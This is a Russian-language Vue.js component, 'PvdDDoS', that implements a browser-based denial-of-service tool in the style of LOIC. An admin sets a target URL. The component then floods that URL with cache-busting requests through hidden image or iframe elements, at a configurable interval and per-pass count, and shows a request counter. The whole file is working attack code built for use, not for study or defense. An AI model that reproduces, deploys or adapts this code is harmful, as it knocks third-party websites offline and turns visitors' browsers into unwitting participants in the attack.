<template>
  <div id="ddos" v-if="targetLocal">
    <h2>Взрыватель</h2>
    <div id="meta">
      <div id="target">
        <div class="noEdit" v-if="!targetEdit">
          Цель: <a :href="targetLocal.link" id="link">{{ targetLocal.link }}</a>
        </div>
        <div class="edit" v-else>
          <form v-on:submit.prevent="changeTarget">
            <div class="form-group">
              <div class="input-group">
                <div class="input-group-prepend">
                  <div class="input-group-text">Ссылка</div>
                </div>
                <input class="form-control" type="text" v-model="link">
                <div class="input-group-append">
                  <button type="submit" class="btn btn-success">Сменить цель</button>
                </div>
              </div>
            </div>
          </form>
        </div>
        <button v-if="$root.userInfo && $root.userInfo.ugroup.split(',').indexOf('admins') > -1" style="margin: 3px" v-on:click="toggleTargetChange" class="btn btn-light editButton"><i class="fa fa-edit"></i></button>
      </div>
      <div id="counter">Запросы: {{ counter }}</div>
    </div>
    <div id="loic">
      <div id="interval">
        <div class="form-group">
          <div class="input-group">
            <div class="input-group-prepend">
              <div class="input-group-text">Интервал (милисекунды)</div>
            </div>
            <input type="number" class="form-control" v-model.number="interval">
          </div>
        </div>
      </div>
      <div id="requestsPerPass">
        <div class="form-group">
          <div class="input-group">
            <div class="input-group-prepend">
              <div class="input-group-text">Запросов за проход</div>
            </div>
            <input type="number" class="form-control" v-model.number="requestsPerPass">
          </div>
        </div>
      </div>
      <div id="mode">
        <div class="form-group">
          <div class="input-group">
            <div class="input-group-prepend">
              <div class="input-group-text">Тип атаки</div>
            </div>
            <select v-model="mode" class="form-control">
              <option value="img">Image</option>
              <option value="iframe">Iframe</option>
            </select>
          </div>
        </div>
      </div>
      <div id="start" v-if="!started">
        <button class="btn btn-success" v-on:click="start">Старт</button>
      </div>
      <div id="stop" v-else>
        <button class="btn btn-danger" v-on:click="stop">Стоп</button>
      </div>
      <div id="hidden">
        <div v-if="mode == 'img'">
          <img v-for="address in addresses" :src="address" :alt="address">
        </div>
        <div v-else-if="mode == 'iframe'">
          <iframe v-for="address in addresses" :src="address"></iframe>
        </div>
      </div>
    </div>
  </div>
  <div v-else>
    <p>Цели нет</p>
    <div v-if="$root.userInfo && $root.userInfo.ugroup.split(',').indexOf('admins') > -1">
      <form v-on:submit.prevent="changeTarget">
        <div class="form-group">
          <div class="input-group">
            <div class="input-group-prepend">
              <div class="input-group-text">Ссылка</div>
            </div>
            <input type="text" class="form-control" v-model="link">
            <div class="input-group-append"><button type="submit" class="btn btn-success">Назначить</button></div>
          </div>
        </div>
      </form>
    </div>
  </div>
</template>

<script>
  import $ from 'jquery'
  export default {
    name: "PvdDDoS",
    props: [ 'target' ],
    data () {
      return {
        counter: 0,
        started: false,
        interval: 350,
        addresses: [],
        requestsPerPass: 1,
        mode: 'img',
        targetEdit: false,
        link: '',
        targetLocal: this.target
      }
    },
    methods: {
      newRandom () {
        let addrs = []
        let delimitter = /\?/g.test(this.target.link) ? '&' : '?'
        if (this.addresses.length == 1000)
          this.addrs = []
        for (let i=0; i < this.requestsPerPass; i++) {
          addrs.push(`${this.target.link}${delimitter}PVD_RULEZZ=${Math.random()}&weAre=https://thirdwave.tk/`)
          this.counter++
        }
        this.addresses = this.addresses.concat(addrs)
      },
      start () {
        let that = this
        that.started = true
        window.attack = setInterval(() => {
          that.newRandom()
        }, that.interval)
      },
      stop () {
        clearInterval(window.attack)
        this.started = false
      },
      toggleTargetChange () {
        this.targetEdit = !this.targetEdit
      },
      changeTarget () {
        let that = this
        let vm = that.$root
        $.ajax({
          url: vm.config.api + '/pvd/target/change',
          type: 'post',
          data: {
            link: that.link,
            token: that.$cookies.get('token')
          },
          success (data) {
            if (data.success) {
              that.targetLocal = data.success
              that.targetEdit = false
            }
            else {
              vm.$emit('error', data.error.data)
            }
          }
        })
      }
    }
  }
</script>

<style scoped>
  #target, #counter, #loic {
    margin-top: 15px;
  }
  #hidden {
    display: none;
  }
  .editButton {
    margin-top: 5px;
  }
  .edit, .noEdit {
    display: inline-block;
  }
</style>
